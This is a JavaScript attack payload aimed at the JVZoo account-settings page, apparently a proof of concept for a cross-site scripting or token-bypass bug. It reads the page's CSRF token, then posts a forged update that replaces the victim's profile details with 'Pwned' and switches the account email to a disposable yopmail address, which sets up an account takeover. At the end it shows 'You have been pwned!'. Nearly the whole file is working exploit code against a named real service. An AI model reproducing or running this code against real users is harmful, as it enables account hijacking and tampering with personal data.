// Step 1: Create the XHR request to capture csrf_protected value
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://www.jvzoo.com/newmyaccount/personalinformation/update', true);

// Set up the onload function to capture the CSRF token
xhr1.onload = function() {
    if (xhr1.status === 200) {
        // Extract csrf_protected token from the page response (Assuming the token is in a hidden input field)
        var csrfToken = xhr1.responseText.match(/name="csrf_protected" value="(.*?)"/);

        if (csrfToken && csrfToken[1]) {
            // Step 2: Prepare and send the POST request with the captured csrf token and other form data
            var xhr2 = new XMLHttpRequest();
            xhr2.open('POST', 'https://www.jvzoo.com/newmyaccount/personalinformation/update', true);
            xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Prepare the POST data
            var postData = 'csrf_protected=' + encodeURIComponent(csrfToken[1]) +
                '&editLegalNamePermission=1' +
                '&displayName=Pwned' +
                '&businessName=Pwned' +
                '&selectedUserDisplayNameOverrideOption=Select Checkout Name' +
                '&email=alt.ja-7xwxon44@yopmail.com' +
                '&phoneNumber=0000000000' +
                '&skype=Pwned' +
                '&facebook=Pwned' +
                '&bio=Pwned' +
                '&addressLine1=Pwned' +
                '&addressLine2=Pwned' +
                '&countryId=Select Country' +
                '&city=Pwned' +
                '&state=Pwned' +
                '&zip=' +
                '&profile_photo[0][imageFile]=' +
                '&profile_photo[0][imageFile][fileStoreTypeId]=' +
                '&profile_photo[0][imageFile][fileUrl]=' +
                '&profile_photo[0][imageFile][filePath]=' +
                '&profile_photo[0][removeExistingFile]=false';

            // Send the POST request with the form data
            xhr2.send(postData);
            
            xhr2.onload = function() {
                if (xhr2.status === 200) {
                    console.log('Form submitted successfully');
                    // Add the prompt after the form is successfully submitted
                    prompt("You have been pwned!");
                } else {
                    console.error('Error submitting form', xhr2.statusText);
                }
            };
        } else {
            console.error('CSRF token not found');
        }
    } else {
        console.error('Error fetching the page', xhr1.statusText);
    }
};

// Send the GET request to fetch the page
xhr1.send();
